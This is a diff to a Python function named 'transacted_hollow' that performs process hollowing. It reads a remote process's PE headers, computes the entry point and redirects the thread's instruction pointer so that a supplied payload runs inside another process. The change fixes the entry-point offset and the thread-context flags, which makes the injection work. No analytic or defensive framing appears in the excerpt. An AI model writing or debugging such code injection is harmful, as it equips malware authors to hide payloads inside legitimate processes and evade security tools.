@@ -223,14 +223,15 @@ def transacted_hollow(payload):
     peOffset=struct.unpack('<I',dosHeader[60:64])[0]
     ntHeaders=ctypes.create_string_buffer(256)
     ReadProcessMemory(pi.hProcess,ctypes.c_void_p(remoteBase.value+peOffset),ntHeaders,256,None)
-    entryPointRVA=struct.unpack('<I',ntHeaders[24:28])[0]
+    # OptionalHeader starts at offset 24 (after Signature 4 bytes + COFF 20 bytes)
+    # EntryPoint is at offset 16 in OptionalHeader, so total offset is 24+16=40
+    entryPointRVA=struct.unpack('<I',ntHeaders[40:44])[0]
     entryPoint=ctypes.c_void_p(remoteBase.value+entryPointRVA)
     
-    # Update thread context (use CONTEXT_INTEGER and set Rcx for x64 entry point)
+    # Update thread context (use CONTEXT_FULL for x64)
     ctx=CONTEXT()
-    ctx.ContextFlags=0x10001  # CONTEXT_INTEGER
+    ctx.ContextFlags=CONTEXT_FULL
     GetThreadContext(pi.hThread,ctypes.byref(ctx))
-    ctx.Rcx=entryPoint.value
     ctx.Rip=entryPoint.value
     SetThreadContext(pi.hThread,ctypes.byref(ctx))
     
